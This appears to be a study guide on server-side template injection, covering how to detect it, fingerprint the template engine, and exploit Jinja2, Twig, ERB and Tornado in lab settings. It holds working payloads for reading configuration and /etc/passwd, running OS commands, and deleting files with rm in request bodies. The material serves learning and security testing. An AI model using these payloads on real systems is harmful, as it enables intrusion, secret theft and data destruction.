# 1. The basics

## Template Engines

Software that combine pre-defined templates with dynamic data to generate web content. They're commonly used for shared elements like headers and footers across website pages, avoiding code duplication and improving maintainability. Popular examples include `Jinja` and `Twig`.

**Templating:** Template engines require two inputs: a template (string or file) with predefined placeholders, and key-value pairs for dynamic data. The engine inserts values at locations marked with corresponding keys. This process of generating the final string is called `rendering`.

---

## SSTI

`Server-side Template Injection` (SSTI) occurs when attackers inject malicious templating code into templates. During rendering, the server may execute this code, potentially allowing complete server takeover.

Template engines securely handle user input when provided as values during rendering, since values are inserted without executing code. SSTI occurs when attackers control the template parameter itself, as engines execute code within templates.

SSTI vulnerabilities arise when:
- User input is inserted into templates before rendering
- Applications render the same template multiple times, treating first rendering output as template input
- Users can directly modify or submit templates

Proper implementation always provides user input as values, never as part of the template string.

---

## How to tell if template is used or not

### Error pages (most reliable)

This is your best signal. If you can trigger an unhandled exception (invalid syntax, a malformed request, an edge case), debug-mode error pages often dump:

- A stack trace naming the templating library directly (e.g. `jinja2.exceptions.TemplateSyntaxError`, `Twig\Error\SyntaxError`, the ERB trace we saw earlier)
- File paths that reveal the framework (`/usr/lib/ruby/...`, `/site-packages/jinja2/...`)
- Line numbers pointing at template-rendering code specifically, not just app code

The catch: this only works if the app is in debug/verbose mode or mishandles the exception. Production apps often show a generic 500 page instead, in which case you're back to inference.

### Headers (weaker, but easy to check)

Headers tell you more about the **framework/language** than the specific **template engine**, though the two are often correlated:

- `Server` / `X-Powered-By` → e.g. `PHP/8.1` narrows you toward Twig/Smarty/Blade; `Express` → toward EJS/Pug/Handlebars; nothing for Python/Java (often stripped or generic)
- Framework-specific headers/cookies → `X-Django`, a `laravel_session` or `PHPSESSID` cookie, `csrftoken` (Django), `JSESSIONID` (Java) — these narrow the candidate pool
- These are easy to spoof or strip, so treat them as a hint, not proof

### Other signals worth combining

- **File extensions / URL patterns** — `.jsp`, `.php`, `.erb`, `.twig`, `.ftl` sometimes leak through even after routing rewrites
- **HTML source comments** — some engines/frameworks leave telltale comments or generator meta tags
- **Response timing/behavior differences** — how the app handles edge cases in input
- **The math/differential payloads from your notes** — this is actually the strongest active technique, since it doesn't depend on the app leaking info passively; you're forcing a behavioral difference

**Bottom line:** headers/error pages are passive reconnaissance — cheap to check first and can save time — but the active fuzzing + differential payload approach from your notes is what actually *confirms* the engine, since passive signals can be wrong, missing, or deliberately obscured.

# 2. Detection & Identification

## Why This Matters

SSTI vulnerabilities often go unnoticed — not because they're complex, but because they only become apparent to auditors who are specifically looking for them. Once detected, they can be surprisingly easy to exploit, especially in unsandboxed environments. Before exploitation, though, you must (1) confirm the vulnerability exists, and (2) identify the specific template engine in use, since each engine has different syntax and supported functions.

---

## Step 1: Detecting SSTI

SSTI identification follows the same logic as other injection vulnerabilities like SQL injection: inject special characters with semantic meaning to the target system and observe how the application responds.

### Generic fuzzing

Try injecting a sequence of characters commonly used across template languages:

```
${{<%[%'"}}%\
```

If this triggers an exception, it suggests the injected syntax is being interpreted by the server — a first sign SSTI may be present. This is analogous to how a single quote (`'`) breaks a SQL query in SQL injection.

Fuzzing alone is not always conclusive. SSTI occurs in two distinct contexts, and it's worth checking both explicitly regardless of the fuzzing result — a vulnerability may reveal itself in one context even if fuzzing was inconclusive, and identifying the context is necessary for exploitation even if fuzzing succeeded.

### Context 1: Plaintext context

Many template languages let you inject content directly into the template body (via HTML or the engine's native syntax), which is rendered server-side before the HTTP response is sent. For example, in Freemarker:

```
render('Hello ' + username)
```

This renders to `Hello Carlos`. This is often mistaken for plain XSS. To test for SSTI instead, submit a mathematical expression as the parameter value:

```
http://vulnerable-website.com/?username=${7*7}
```

If the output is `Hello 49`, the expression was evaluated server-side — strong proof-of-concept evidence of SSTI. (The exact syntax needed depends on the engine — see Step 2.)

### Context 2: Code context

Here, user input is placed *inside* a template expression rather than the template body — e.g., a user-controlled variable name used in a lookup:

```
greeting = getQueryParameter('greeting')
engine.render("Hello {{" + greeting + "}}", data)
```

Requested as:

```
http://vulnerable-website.com/?greeting=data.username
```

This renders as `Hello Carlos` — easy to miss, since it looks like a harmless hashmap lookup rather than obvious XSS. To test:

1. **Rule out direct XSS** by injecting arbitrary HTML:
   ```
   http://vulnerable-website.com/?greeting=data.username<tag>
   ```
   Absent XSS, this typically produces blank output, HTML-encoded tags, or an error.

2. **Try to break out of the expression** using template syntax, then inject HTML after it:
   ```
   http://vulnerable-website.com/?greeting=data.username}}<tag>
   ```
   - Error or blank output → either the wrong engine's syntax was used, or SSTI isn't possible here.
   - Output renders correctly *with* the injected HTML (`Hello Carlos<tag>`) → strong indicator that SSTI is present.

---

## Step 2: Identifying the Template Engine

Once SSTI is confirmed, the next step is figuring out *which* engine is running, since exploitation payloads are engine-specific. Despite the large number of templating languages, most use similar syntax deliberately chosen to avoid clashing with HTML — which makes it practical to build small probing payloads that narrow things down quickly.

### Method 1: Invalid syntax → error messages

Submitting invalid syntax is often enough on its own, since the resulting error frequently names the engine (and sometimes the version) directly. For example, the invalid expression:

```
<%=foobar%>
```

produces this response from Ruby's ERB engine:

```
(erb):1:in `<main>': undefined local variable or method `foobar' for main:Object (NameError)
from /usr/lib/ruby/2.5.0/erb.rb:876:in `eval'
from /usr/lib/ruby/2.5.0/erb.rb:876:in `result'
from -e:4:in `<main>'
```

This immediately reveals the engine (ERB) — no further guessing required.

### Method 2: Differential math payloads

Where errors aren't descriptive enough, inject mathematical operations using syntax from different engines and observe which are evaluated successfully — a process of elimination that narrows down the options faster than testing engines one by one.

![image](https://github.com/user-attachments/assets/4e98f720-54fe-4543-936b-2e008dae7275)

We will start by injecting the payload `${7*7}` and follow the diagram from left to right, depending on the result of the injection. Suppose the injection resulted in a successful execution of the injected payload. In that case, we follow the green arrow; otherwise, we follow the red arrow until we arrive at a resulting template engine.

**Note:** the result of payload `{{7*'7'}}` will enable us to deduce the template engine used by the web application. In `Jinja`, the result will be `7777777`, while in `Twig`, the result will be `49`.

The result depends on how the engine's underlying language handles multiplying an integer by a string:

| Engine | Language | Result | Why |
|---|---|---|---|
| Jinja2 | Python | `7777777` | Python's `*` operator repeats a string N times |
| Twig | PHP | `49` | PHP coerces `'7'` to the integer `7`, then multiplies |

Combining this with a basic `${7*7}`-style test (does the expression evaluate at all?) and branching based on success/failure lets you walk through a decision tree of engines until you converge on the correct one.

### Practical workflow

1. Inject `${7*7}` (or the engine-appropriate equivalent). If it evaluates to `49`, template evaluation is happening.
2. Try `{{7*'7'}}` to disambiguate between engines that handle mixed-type arithmetic differently (e.g., Jinja2 vs. Twig).
3. If results are still ambiguous, submit deliberately invalid syntax and read the resulting error/stack trace — this often names the engine outright.
4. Cross-reference which payloads succeeded vs. failed against known engine syntax tables to converge on a single candidate.

---

## Summary

| Stage | Goal | Key Technique |
|---|---|---|
| Detect | Confirm SSTI exists | Fuzz string `${{<%[%'"}}%\`; test plaintext context (`${7*7}` → `49`) and code context (breakout + HTML injection) |
| Identify | Determine the engine | Invalid-syntax error messages; differential math payloads (`{{7*'7'}}`) |

Once the engine is identified, exploitation payloads can be selected from that engine's specific syntax and capabilities.

# 3. Exploiting SSTI - Jinja2

Assuming that we have successfully identified that the web application uses the `Jinja` template engine. We will only focus on the SSTI exploitation and thus assume that the SSTI confirmation and template engine identification have already been done in a previous step.

`Jinja` is a template engine commonly used in Python web frameworks such as `Flask` or `Django`. This section will focus on a `Flask` web application. The payloads in other web frameworks might thus be slightly different.

## Jinja2 Information Disclosure

We can exploit the SSTI vulnerability to obtain internal information about the web application, including configuration details and the web application's source code. For instance, we can obtain the web application's configuration using the following SSTI payload:

`{{ config.items() }}`

This payload dumps the entire web application configuration, including any used secret keys, we can prepare further attacks using the obtained information.

We can also execute Python code to obtain information about the web application's source code. We can use the following SSTI payload to dump all available built-in functions:

`{{ self.__init__.__globals__.__builtins__ }}`

## Jinja2 File Read

We can use Python's built-in function `open` to include a local file. However, we cannot call the function directly; we need to call it from the **`__builtins__`** dictionary we dumped earlier. This results in the following payload to include the file `/etc/passwd`:

`{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}`

## Jinja2 Remote Code Execution

To achieve remote code execution in Python, we can use functions provided by the `os` library, such as `system` or `popen`. However, if the web application has not already imported this library, we must first import it by calling the built-in function `import`. This results in the following SSTI payload:

`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`

# 4. Exploiting SSTI - Twig

Like in the previous section, we will only focus on the SSTI exploitation and thus assume that the SSTI confirmation and template engine identification have already been done in a previous step. `Twig` is a template engine for the `PHP` programming language.

## Twig Information Disclosure

In Twig, we can use the `_self` keyword to obtain a little information about the current template:

`{{ _self }}`

(However, the amount of information is limited compared to Jinja.)

## Twig File Read

Reading local files (without using the same way as we will use for RCE) is not possible using internal functions directly provided by Twig. However, the PHP web framework `Symfony` defines additional Twig filters. One of these filters is `file_excerpt` and can be used to read local files:

`{{ "/etc/passwd"|file_excerpt(1,-1) }}`

## Twig Remote Code Execution

To achieve remote code execution, we can use a PHP built-in function such as `system`. We can pass an argument to this function by using Twig's `filter` function, resulting in any of the following SSTI payloads:

`{{ ['id'] | filter('system') }}` ("may require specific Twig version / non-sandboxed context")

> **Note:** `{{ ['id'] | filter('system') }}` depends on Twig's sandbox/version and whether filter is exposed as a callable-mapping trick; in modern Twig (post-sandboxing hardening) this often doesn't work out of the box.

# 5. Exploiting SSTI - ERB

Assuming that we have successfully identified that the web application uses the `ERB` template engine. We will only focus on the SSTI exploitation and thus assume that the SSTI confirmation and template engine identification have already been done in a previous step.

`ERB` (Embedded RuBy) is Ruby's built-in template engine, used directly by frameworks such as `Ruby on Rails`. Unlike Jinja2 or Twig, ERB doesn't wrap a restricted expression sub-language — it drops straight into a Ruby `eval` context, so once execution is confirmed there's no dictionary/builtins gymnastics needed to reach dangerous functionality; it's already there.

## ERB Information Disclosure

Submitting an invalid ERB tag both confirms the engine and gives us a NameError we can read for context:

`<%hehe%>`

```
(erb):1:in `<main>': undefined local variable or method `hehe' for main:Object (NameError)
	from /usr/lib/ruby/2.7.0/erb.rb:905:in `eval'
	from /usr/lib/ruby/2.7.0/erb.rb:905:in `result'
	from -e:4:in `<main>'
```

The `NameError` and the `erb.rb` file paths confirm this is Ruby's ERB evaluating our input as code, not just reflecting it.

Basic math confirms output-producing evaluation, same as with the other engines:

`<%= 7 * 7 %>` → renders `49`

Once evaluation is confirmed, we can inspect the current execution context using Ruby's own reflection methods:

```
<%= self %>
<%= self.class.name %>
<%= self.methods %>
```

- `self` reveals what object ERB is currently executing in
- `self.class.name` names that object's class
- `self.methods` dumps every method callable on it — useful for enumerating further attack surface exposed by the app (custom helpers, instance variables leaking app internals, etc.)

## ERB File Read

Because we're executing raw Ruby, `File` is directly accessible without needing to unwrap it from a builtins dict first:

`<%= File.open('/etc/passwd').read %>`

## ERB Remote Code Execution

Likewise, `Kernel#system` is directly callable:

```
<%= system("ls") %>
<%= system("pwd") %>
<%= system("whoami") %>
```

In a lab/live-target context, this is enough to execute arbitrary OS commands, e.g.:

```
GET /?message=<%= system("rm /home/carlos/morale.txt") %> HTTP/2
```

**Note:** `<% %>` (no `=`) executes code but does not print the result into the response; `<%= %>` executes *and* prints. Always reach for `<%= %>` first when confirming/exploiting, since silent execution (`<% %>`) can still work for RCE but gives you no feedback to confirm success.

**Caveat on `system()`:** `system("ls")` and `system("rm ...")` return a boolean (`true`/`false`), not command output. For output exfiltration, use backticks or `IO.popen`:

```
<%= \`ls\` %>
<%= IO.popen("id").read %>
```

# 6. Exploiting SSTI - Tornado

Assuming that we have successfully identified that the web application uses the `Tornado` template engine. We will only focus on the SSTI exploitation and thus assume that the SSTI confirmation and template engine identification have already been done in a previous step.

`Tornado` is a Python web framework with its own bundled templating engine. Like Jinja2, expressions use `{{ }}` and statements use `{% %}` — but Tornado compiles templates directly into Python source and `exec`s them, so there's no sandbox layer to bypass. If our input lands inside an already-open `{{ }}` expression, we first need to close it out before injecting our own tag, otherwise we get a `SyntaxError` rather than clean execution.

## Tornado Information Disclosure

Submitting a polyglot payload with mismatched brackets and quotes both confirms the engine and gives us a stack trace to fingerprint it with:

`user.first_name${{<%[%'"}}%\`

```
No handlers could be found for logger "tornado.application"
Traceback (most recent call last):
  File "<string>", line 15, in <module>
  File "/usr/local/lib/python2.7/dist-packages/tornado/template.py", line 317, in __init__
    "exec", dont_inherit=True)
  File "<string>.generated.py", line 4
    _tt_tmp = user.first_name${{<%[%'"
                                      # <string>:1
                                          ^
SyntaxError: invalid syntax
```

The reference to `tornado/template.py` and the `_tt_tmp` variable name in the generated Python source confirm the engine as Tornado.

Since our input is reflected inside an existing `{{ user.first_name }}` expression, we need to close it with `}}` before our own payload will parse cleanly. Confirming with arithmetic:

`user.first_name}}{{7*7}}` → renders `Peter49`

Note that Tornado does not require the trailing `}}` to be re-supplied by us — we can leave it open and let the template's original closing tag handle it:

`user.first_name}}{{7*7` → also renders `Peter49`

## Tornado File Read

Because Tornado templates compile straight into a Python `exec` context, we don't need to import anything to reach builtins — `open()` is directly callable:

`user.first_name}}{{ open('/etc/passwd').read() }}`

## Tornado Remote Code Execution

Tornado's statement tag (`{% %}`) supports real Python statements, including `import`, which gives us a clean path to the `os` module:

`user.first_name}}{% import os %}{{ os.system("pwd") }}`

Spaces are often filtered/stripped by front-end validation on these payloads — Tornado will still parse `+` (URL-encoded space) or `%25` (a literal `%`, sometimes needed to smuggle `%}` past naive filters):

`user.first_name}}{%+import+os+%}{{os.system("pwd")}}`

Once execution is confirmed, we escalate to full RCE, e.g. deleting a target file in a lab environment:

```
blog-post-author-display=user.first_name}}{% import os %}{{ os.system("rm /path/to/file") }}&csrf=xMILtf10706mlK4NoxoBe0y0xxlVGS6z
```

```
blog-post-author-display=user.first_name}}{%+import+os+%}{{os.system('rm+morale.txt')}}&csrf=xMILtf10706mlK4NoxoBe0y0xxlVGS6z
```

Alternative payloads achieving the same result, useful if `import` is blacklisted or if we want output back instead of a boolean:

`{{ __import__('os').remove('/path/to/file') }}` — deletes a file directly via `os.remove`, without a separate import statement

`{{ __import__('os').system('rm /path/to/file') }}` — same idea for arbitrary command execution

`{% import os %}{{ os.popen("rm /path/to/file").read() }}` — using `popen().read()` instead of `system()` also captures stdout, which is useful for commands where you want the output reflected back (e.g. `os.popen("id").read()`) rather than just the exit status
